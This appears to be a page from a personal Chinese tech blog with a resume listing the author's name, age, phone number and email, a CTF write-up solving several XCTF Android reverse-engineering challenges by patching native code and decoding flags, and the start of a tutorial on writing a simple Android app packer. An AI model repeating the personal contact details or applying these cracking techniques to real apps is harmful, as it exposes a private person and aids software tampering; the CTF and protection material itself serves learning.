<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  <title>ssj的博客</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="ssj的博客">
<meta property="og:url" content="https://github.com/Cracke-S-J/page/2/index.html">
<meta property="og:site_name" content="ssj的博客">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ssj的博客">
  
    <link rel="alternative" href="/atom.xml" title="ssj的博客" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/head.png" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate">ssj</a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">博客首页</a></li>
                        
                            <li><a href="/categories/programming/">编程相关</a></li>
                        
                            <li><a href="/categories/opera/">跟ssj一起听戏</a></li>
                        
                            <li><a href="/2019/05/29/resume/">本人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="/1263914174@qq.com" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/Cracke-S-J" title="github">github</a>
                            
                                <a class="fl QQ" target="_blank" href="/1263914174" title="QQ">QQ</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Ethereum/" style="font-size: 15px;">Ethereum</a> <a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/resume/" style="font-size: 10px;">resume</a> <a href="/tags/京剧/" style="font-size: 20px;">京剧</a> <a href="/tags/其它/" style="font-size: 10px;">其它</a> <a href="/tags/定场诗/" style="font-size: 10px;">定场诗</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">name</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">大学生，XCalibyte 实习中，业余票友，专业android逆向，资深猫奴。</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">ssj</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">ssj</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">博客首页</a></li>
                
                    <li><a href="/categories/programming/">编程相关</a></li>
                
                    <li><a href="/categories/opera/">跟ssj一起听戏</a></li>
                
                    <li><a href="/2019/05/29/resume/">本人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="/1263914174@qq.com" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/Cracke-S-J" title="github">github</a>
                    
                        <a class="QQ" target="_blank" href="/1263914174" title="QQ">QQ</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-resume" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/05/29/resume/" class="article-date">
      <time datetime="2019-05-29T12:32:02.000Z" itemprop="datePublished">2019-05-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/29/resume/">简历</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>2019-09-22版。</p>
<p>有pdf版，会好看一些。</p>
<hr>
<h1 id="孙少洁"><a href="#孙少洁" class="headerlink" title="孙少洁"></a>孙少洁</h1><p>女 | 19 | 本科在读 | 工作经验：2019-1-14 至今</p>
<p>北京科技大学 | 计算机科学与技术 | 博客：cracke-s-j.github.io</p>
<p>电话：13697842656  |  email：<a href="mailto:cracke_sun@163.com" target="_blank" rel="noopener">cracke_sun@163.com</a></p>
<h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul>
<li>熟悉 Android 逆向基本流程；熟悉应用加固常用手段。</li>
<li>熟悉 IDA、Jadx、Apktool 等常用逆向分析工具，熟悉 Fdex2 等脱壳工具。</li>
<li>熟练掌握静态分析，动态调试等逆向技术，熟悉 Frida、Xposed 等热门 hook 框架。</li>
<li>熟悉 Java、C++，熟练运用 python，具有编写脚本、开发工具的能力。</li>
<li>熟悉 JNI 编程，读过 Android 源码，了解 dvm、art 虚拟机运行机制、Android 打包、运行过程。</li>
<li>熟悉安卓加壳技术，了解一些通用脱壳机的原理，并能够手动脱一、二代壳。</li>
<li>熟悉 ARM、x86/64 等指令集，了解编译原理。</li>
<li>了解常用加解密算法；熟悉多种算法与数据结构。</li>
<li>熟悉渗透测试基本流程，能独立完成 Android、iOS 客户端、接口渗透测试。</li>
<li>有阅读英文文档的能力；有较强沟通能力与团队协作意识。</li>
</ul>
<h2 id="项目-工作经历"><a href="#项目-工作经历" class="headerlink" title="项目/工作经历"></a>项目/工作经历</h2><ul>
<li>开发 Android 一代壳，用到 Dex 加密、动态加载技术。</li>
<li>逆向分析过 Android 市场上多款 App，写过插件，出过应用修改版。</li>
<li>在保密项目无源程序的情况下，独立将几万行 sparc 汇编翻译为 C 语言。</li>
<li>参与国内某端游辅助制作，主要负责动态分析关键 call、编写客户端。</li>
<li>在学校参与“基于深度学习的网络爬虫鉴别”项目，主要负责机器学习模型建立与数据统计。</li>
<li>2019-1-14——2019-8-4——梆梆安全——安全服务工程师<ul>
<li>主要方向是 Android 逆向，主要负责渗透测试、培训、应急响应、研究新技术。</li>
<li>工作期间负责过一段时间智能合约安全研究，完成“智能合约源码审计标准”，并培训新人相关知识。</li>
</ul>
</li>
<li>2019-8-5 至今——XCalibyte——软件工程师<ul>
<li>负责完成编译器 preprocess 部分，兼容 CMake、scons、MSBuild 等多种 tool chain，用到 Hook 技术抓取编译流程，与直接分析 Makefile 相比效率和准确性都大有提高。</li>
</ul>
</li>
<li>CTF（全国大学生信息安全竞赛）华北赛区二等奖；Noip（全国青少年计算机程序设计竞赛）联赛二等奖；蓝桥杯程序设计竞赛校赛一等奖（第三名）；ACM-ICPC（国际大学生程序设计竞赛）进入校冬训队。</li>
</ul>
<h2 id="自我描述"><a href="#自我描述" class="headerlink" title="自我描述"></a>自我描述</h2><ul>
<li>热爱技术；热爱学习；热爱分享；心态稳，不畏困难。现学现卖的能力很强。</li>
<li>初中开始接触编程，对计算机尤其是逆向有浓厚的兴趣与长久的热情，享受破解的过程带来的快乐。</li>
<li>现本科大二在读，课余时间较多，紧急事件随叫随到，接受任何时间加班。</li>
<li>现在仍在不断学习，简历会随时更新调整。没有研究过怎么写简历。</li>
</ul>
<h2 id="兴趣爱好"><a href="#兴趣爱好" class="headerlink" title="兴趣爱好"></a>兴趣爱好</h2><ul>
<li>写代码</li>
<li>逆向分析市场上一些 APP</li>
<li>为开发的朋友的 App 加固</li>
<li>逛论坛、逛 github、参加技术交流会议</li>
<li>养猫、云养猫</li>
<li>中国传统曲艺，京评梆曲</li>
</ul>
<hr>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/resume/">简历</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/resume/">resume</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-CTF-android" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/05/29/CTF-android/" class="article-date">
      <time datetime="2019-05-29T11:42:47.000Z" itemprop="datePublished">2019-05-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/29/CTF-android/">小菜比ssj吹头发记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <blockquote>
<p>ssj是一只小菜比，ta应公司要求要写吹头发android逆向屁屁踢，所以ta需要起码做点题。</p>
</blockquote>
<h2 id="XCTF-1th-apk逆向"><a href="#XCTF-1th-apk逆向" class="headerlink" title="XCTF 1th apk逆向"></a>XCTF 1th apk逆向</h2><p>这是一道签到题，可以动态调试，可以还原算法，可以打印log。ssj选择了还原算法，因为就是一个md5。</p>
<p><strong>flag{bc72f242a6af3857};</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">    String userName = <span class="string">"Tenshine"</span>;</span><br><span class="line">    MessageDigest digest =MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">    digest.update(userName.getBytes());</span><br><span class="line">    String hexstr = toHexString(digest.digest(), <span class="string">""</span>);</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        sb.append(hexstr.charAt(i));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(sb.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">toHexString</span><span class="params">(<span class="keyword">byte</span>[] bytes, String separator)</span> </span>&#123;</span><br><span class="line">    StringBuilder hexString = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</span><br><span class="line">        String hex = Integer.toHexString(b &amp; <span class="number">255</span>);</span><br><span class="line">        hexString.append(hex).append(separator);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexString.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="XCTF-easy-dex"><a href="#XCTF-easy-dex" class="headerlink" title="XCTF easy-dex"></a>XCTF easy-dex</h2><p>本题flag: <strong>qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</strong></p>
<p>这题dex是动态加载的，算是0代壳吧，加载条件是10秒里晃手机100次。IDA反编译so，看到它是先加载dex，然后优化了dex，把原dex删了，我们要做的是得到原dex，然后分析加密算法。</p>
<ol>
<li><p>hook掉remove函数，阻止文件被删除。</p>
</li>
<li><p>直接将存储在lib中的加密后的dex异或解密，再zlib解压。</p>
</li>
<li><p>静态修改so，把remove函数patch掉。（本人用的方法，上面两个只是说说）</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0000275A                 MOV             R0, R11</span><br><span class="line">.text:0000275C                 BL              sub_2368</span><br><span class="line">.text:00002760                 ADD             R0, SP, #0x160+filename ; filename</span><br><span class="line">.text:00002762                 BLX             remove ; 把这句patch掉</span><br><span class="line">.text:00002766                 LDR             R1, =(aFindmydex - 0x2770)</span><br><span class="line">.text:00002768                 MOVS            R0, #4</span><br><span class="line">.text:0000276A                 LDR             R2, =(aCongratulation - 0x2772)</span><br><span class="line">.text:0000276C                 ADD             R1, PC  ; &quot;FindMyDex&quot;</span><br><span class="line">.text:0000276E                 ADD             R2, PC  ; &quot;Congratulations!! You made it!&quot;</span><br><span class="line">.text:00002770                 BLX             __android_log_print</span><br></pre></td></tr></table></figure>
<p>分析dex，看出是Twofish算法,在线解密。<br>密文是：884df2da1105d62ce06d551f18a590ad40ad805405a29ee21246e647059dc2c6751dd40670fc51540916cd5fde0c2f4d。<br>密钥是：I have a male fish and a female fish.</p>
<h2 id="XCTF-黑客精神"><a href="#XCTF-黑客精神" class="headerlink" title="XCTF 黑客精神"></a>XCTF 黑客精神</h2><p>本题坑点在于，要给它开读写权限，否则只能手动翻找flag格式…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00002E77                 DCB 0x66 ; f</span><br><span class="line">.rodata:00002E78                 DCB 0x6C ; l</span><br><span class="line">.rodata:00002E79                 DCB 0x61 ; a</span><br><span class="line">.rodata:00002E7A                 DCB 0x67 ; g</span><br><span class="line">.rodata:00002E7B                 DCB 0x2C ; ,</span><br><span class="line">.rodata:00002E7C                 DCB 0xE6</span><br><span class="line">.rodata:00002E7D                 DCB 0xA0</span><br><span class="line">.rodata:00002E7E                 DCB 0xBC</span><br><span class="line">.rodata:00002E7F                 DCB 0xE5</span><br><span class="line">.rodata:00002E80                 DCB 0xBC</span><br><span class="line">.rodata:00002E81                 DCB 0x8F</span><br><span class="line">.rodata:00002E82                 DCB 0xE4</span><br><span class="line">.rodata:00002E83                 DCB 0xB8</span><br><span class="line">.rodata:00002E84                 DCB 0xBA</span><br><span class="line">.rodata:00002E85                 DCB 0x78 ; x</span><br><span class="line">.rodata:00002E86                 DCB 0x6D ; m</span><br><span class="line">.rodata:00002E87                 DCB 0x61 ; a</span><br><span class="line">.rodata:00002E88                 DCB 0x6E ; n</span><br><span class="line">.rodata:00002E89                 DCB 0x7B ; &#123;</span><br><span class="line">.rodata:00002E8A                 DCB 0xE2</span><br><span class="line">.rodata:00002E8B                 DCB 0x80</span><br><span class="line">.rodata:00002E8C                 DCB 0xA6</span><br><span class="line">.rodata:00002E8D                 DCB 0xE2</span><br><span class="line">.rodata:00002E8E                 DCB 0x80</span><br><span class="line">.rodata:00002E8F                 DCB 0xA6</span><br><span class="line">.rodata:00002E90                 DCB 0x7D ; &#125;</span><br></pre></td></tr></table></figure>
<p>密文：EoPAoY62@ElRD；密钥：W3_arE_whO_we_ARE</p>
<p>加密算法就是一个异或。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> key[] = <span class="string">"W3_arE_whO_we_ARE"</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encode</span><span class="params">(<span class="keyword">char</span> s[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s); </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">2016</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i != len;i++) &#123; </span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span> == <span class="number">1</span>)&#123; </span><br><span class="line">            j = (j+<span class="number">5</span>)%<span class="number">16</span>; </span><br><span class="line">            s[i] = s[i]^key[j+<span class="number">1</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">3</span> == <span class="number">2</span>) &#123; </span><br><span class="line">            j = (j+<span class="number">7</span>)%<span class="number">15</span>; </span><br><span class="line">            s[i] = s[i]^key[j+<span class="number">2</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            j = (j+<span class="number">3</span>)%<span class="number">13</span>; </span><br><span class="line">            s[i] = s[i]^key[j+<span class="number">3</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="XCTF-love你是谁"><a href="#XCTF-love你是谁" class="headerlink" title="XCTF love你是谁"></a>XCTF love你是谁</h2><p>一波翻找直接找到了flag。</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const-string v7, <span class="string">"You get the sorted flag\uff1a20667 25105 26159 36924"</span></span><br></pre></td></tr></table></figure>
      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/programming/">编程</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-ssj-android-shell-0th" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/05/17/ssj-android-shell-0th/" class="article-date">
      <time datetime="2019-05-17T11:38:07.000Z" itemprop="datePublished">2019-05-17</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/17/ssj-android-shell-0th/">小菜比ssj写了一个壳子</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>nemo大佬来北京，聊天中问起我最近有没有写代码，我一想，好像是真没有，所以单纯是想来写个代码。</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>零代壳，稍微明白点的人用010就（或者什么方法都能）可以拿掉，但是因为太垃圾通用脱壳机不能脱，可以挡一些不是很明白的人hhh，批话王。思路是从百度剽窃的，后续还会升级，再加一些其它加固措施。</p>
<h3 id="三部分"><a href="#三部分" class="headerlink" title="三部分"></a>三部分</h3><p>整个过程主要有三部分，第一是源apk，第二是那个壳（？可以这么叫），第三是一个加密工具，把前2个合成一个apk。前两个是android工程，第三个是用什么写都行此处用的java。</p>
<h4 id="源apk"><a href="#源apk" class="headerlink" title="源apk"></a>源apk</h4><p>这个就是源apk，这个要注意的是写的时候要有一个application。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.i(<span class="string">"demo"</span>, <span class="string">"source apk onCreate:"</span>+<span class="keyword">this</span>);</span><br><span class="line">        Toast.makeText(MyApplication.<span class="keyword">this</span>,<span class="string">"application,start!"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>application标签里，android:name那个地方写我们写的application，否则就是默认系统给创建的。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".MyApplication"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:ignore</span>=<span class="string">"GoogleAppIndexingWarning"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="那个壳"><a href="#那个壳" class="headerlink" title="那个壳"></a>那个壳</h4><p>两个类，代码写的已经很明白了，不多解释。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span 